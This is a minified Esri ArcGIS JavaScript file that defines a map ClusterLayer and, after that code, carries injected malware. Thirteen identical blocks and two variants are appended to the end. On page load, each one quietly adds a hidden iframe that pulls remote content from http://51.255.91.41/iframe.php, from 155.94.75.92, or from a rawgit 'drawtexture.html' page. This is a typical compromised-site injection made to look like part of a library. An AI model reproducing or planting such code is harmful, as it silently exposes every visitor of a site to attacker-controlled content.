// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/array dojo/_base/Color esri/layers/GraphicsLayer esri/graphic esri/geometry/geometryEngine esri/geometry/Extent esri/geometry/Point esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol".split(" "),function(t,y,m,z,p,A,B,v,q,w,C,D){return t("ClusterLayer",[z],{constructor:function(a){this.name=a.id;this.displayOnPan=a.displayOnPan||!1;this._map=a.map;this.clusterSize=a.clusterSize||100;this.color=a.color||"#ff0000";
this.countField=a.countField;this._features=[];try{this.setFeatures(a.features)}catch(b){console.log(b)}this.loaded=!0;this.onLoad(this)},setFeatures:function(a){this._map&&this._map.infoWindow.isShowing&&this._map.infoWindow.hide();this._features=a;this._clusterFeatures()},setColor:function(a){this.color=a;this._clusterFeatures()},_clusterFeatures:function(){this.clear();var a=this._features;if(0<a.length){var b=this.clusterSize,f=[],e=this._map.spatialReference,g=this._map.extent,c=g.normalize();
1<c.length&&(g=A.union(c).getExtent());for(var c=new v(g.xmin,g.ymax,e),h=Math.ceil(this._map.height/b),k=Math.ceil(this._map.width/b),d=g.getWidth()/this._map.width*b,b=g.getHeight()/this._map.height*b,g=0;g<h;g++)for(var u=0;u<k;u++){var l=c.x+d*u,n=c.y-b*g,n=new B(l,n-b,l+d,n,e),l=[],r;for(r in a){var x=a[r];n.contains(x.geometry)&&l.push(x)}0<l.length&&(n=this._getClusterCenter(l),f.push({center:n,graphics:l}))}for(var t in f)a=f[t],e=this._getClusterCount(a),c=a.graphics,h=e.toString(),k=19*
h.length,d=this._getSymbolColor(),b=new w(w.STYLE_NULL,new m(0,0,0,0),0),r=new q(q.STYLE_CIRCLE,1.6*k,b,new m([d[0],d[1],d[2],.4])),k=new q(q.STYLE_CIRCLE,k,b,new m([d[0],d[1],d[2],.8])),d=new C,d.family="Arial",d.size="12px",h=new D(h,d,"#ffffff"),h.setOffset(0,-4),c={Count:e,Data:c},1<e?(this.add(new p(a.center,r,c)),this.add(new p(a.center,k,c)),this.add(new p(a.center,h,c))):(a=a.graphics[0].geometry,this.add(new p(a,k,c)),this.add(new p(a,h,c)))}},_getSymbolColor:function(){var a=m.fromString(this.color),
b=m.fromString("#000000");return m.blendColors(a,b,.1).toRgb()},_getClusterCount:function(a){for(var b=0,f=0;f<a.graphics.length;f++)var e=a.graphics[f],b=this.countField&&e.attributes[this.countField]?b+e.attributes[this.countField]:b+1;return b},_getClusterCenter:function(a){var b=0,f=0,e=a.length;y.forEach(a,function(a){b+=a.geometry.x;f+=a.geometry.y},this);return new v(b/e,f/e,a[0].geometry.spatialReference)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});